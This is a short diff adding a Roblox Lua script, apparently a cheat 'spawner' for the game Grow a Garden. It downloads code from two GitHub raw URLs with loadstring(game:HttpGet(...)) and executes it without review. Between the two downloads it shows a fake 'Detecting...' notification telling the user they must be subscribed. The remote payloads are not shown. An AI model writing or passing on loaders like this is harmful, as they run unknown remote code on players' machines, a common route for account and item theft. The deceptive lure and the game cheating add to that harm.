@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sophiasy2008/test/refs/heads/main/test",true))()
+wait(1)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "🔔 You must be subscribed to me for 1/2 Day",
+    Text = "Detecting...",
+    Duration = 6
+})
+local Spawner = 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sophiasy2008/GrowaGarden/refs/heads/main/spawner.lua"))()
+Spawner.Load()
